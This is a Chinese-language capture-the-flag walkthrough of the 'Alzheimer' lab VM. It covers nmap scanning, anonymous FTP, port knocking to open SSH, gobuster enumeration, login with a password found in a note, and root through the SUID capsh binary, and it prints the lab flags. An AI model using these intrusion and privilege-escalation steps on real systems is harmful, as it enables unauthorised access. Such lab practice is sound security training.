## Alzheimer

> ⏲️ Release Date // 2020-10-03
>
> ✔️ MD5 // 181b8e3df47b920d4c9fb00e9e019986
>
> ☠ Root // 240
>
> 💀 User // 246

### 主机探测和nmap扫描

```bash
┌──(root㉿kali)-[~]
└─# nmap -sn 192.168.56.100/24                   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-25 08:40 EDT
Nmap scan report for 192.168.56.100
Host is up (0.00037s latency).
MAC Address: 08:00:27:01:69:57 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.116
Host is up (0.00015s latency).
MAC Address: 0A:00:27:00:00:1C (Unknown)
Nmap scan report for 192.168.56.122
Host is up (0.00062s latency).
MAC Address: 08:00:27:10:58:2B (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.101
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 11.20 seconds
```

靶机ip：192.168.56.122

进行TCP的全端口扫描

```bash
nmap -sT --min-rate 10000 -p- 192.168.56.122
```

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-25 08:43 EDT
Nmap scan report for 192.168.56.122
Host is up (0.014s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:10:58:2B (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 5.88 seconds
```

开放21，22，80端口

进行详细端口的扫描

```bash
nmap -sT -sV -sC -O -p21,22,80 192.168.56.122
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.56.101
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp filtered  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 b1:3b:2b:36:e5:6b:d7:2a:6d:ef:bf:da:0a:5d:2d:43 (RSA)
|   256 35:f1:70:ab:a3:66:f1:d6:d7:2c:f7:d1:24:7a:5f:2b (ECDSA)
|_  256 be:15:fa:b6:81:d6:7f:ab:c8:1c:97:a5:ea:11:85:4e (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:10:58:2B (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

21端口可以匿名登录，22端口是被过滤的状态

### 查看FTP服务

```bash
ftp 192.168.56.122
```

```
ftp> ls -lah
229 Entering Extended Passive Mode (|||47700|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        113          4096 Oct 03  2020 .
drwxr-xr-x    2 0        113          4096 Oct 03  2020 ..
-rw-r--r--    1 0        0             116 May 25 07:14 .secretnote.txt
226 Directory send OK.
ftp> get .secretnote.txt
```

`.secretnote.txt`内容

```
I need to knock this ports and 
one door will be open!
1000
2000
3000
Ihavebeenalwayshere!!!
Ihavebeenalwayshere!!!
```

靶机有knockd服务，我们需要knock指定端口开启ssh服务

```bash
knock 192.168.56.122 1000 2000 3000
```

nmap再次扫描发现22端口是开放状态

### web渗透

访问web页面

> I dont remember where I stored my password :( I only remember that was into a .txt file... -medusa

得到一个用户名`medusa`

发现莫斯密码，解密得到`OTHING`(很可能是SSH服务的密码)

![image-20240525205824556](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240525205824556.png)

#### 目录扫描

```bash
gobuster dir -u http://192.168.56.122/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/home                 (Status: 301) [Size: 185] [--> http://192.168.56.122/home/]
/admin                (Status: 301) [Size: 185] [--> http://192.168.56.122/admin/]
/secret               (Status: 301) [Size: 185] [--> http://192.168.56.122/secret/]
```

/home页面

> Maybe my pass is at home! -medusa

/secret页面

> Maybe my password is in this secret folder?

测试ssh是否可以登录，发现`OTHING`不是密码，想到上面的txt文件

发现`Ihavebeenalwayshere!!!`是密码

成功登录进`medusa`用户

> HMVrespectmemories

### 尝试提权

发现可以无密码使用id命令

```bash
medusa@alzheimer:~$ sudo -l
Matching Defaults entries for medusa on alzheimer:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User medusa may run the following commands on alzheimer:
    (ALL) NOPASSWD: /bin/id
```

```bash
medusa@alzheimer:~$ sudo id
uid=0(root) gid=0(root) groups=0(root)
```

搜索了一下没有发现id可以怎么提权

#### suid提权

寻找有suid权限的文件

```bash
medusa@alzheimer:~$ find / -type f -perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/umount
/usr/bin/gpasswd
/usr/sbin/capsh
```

利用[GTFOBins](https://gtfobins.github.io/#)，找到capsh的提权方法

```bash
./capsh --gid=0 --uid=0 --
```

```bash
medusa@alzheimer:~$ /usr/sbin/capsh --gid=0 --uid=0 --
root@alzheimer:~# cd /root
root@alzheimer:/root# cat root.txt 
HMVlovememories
```

拿到root.txt

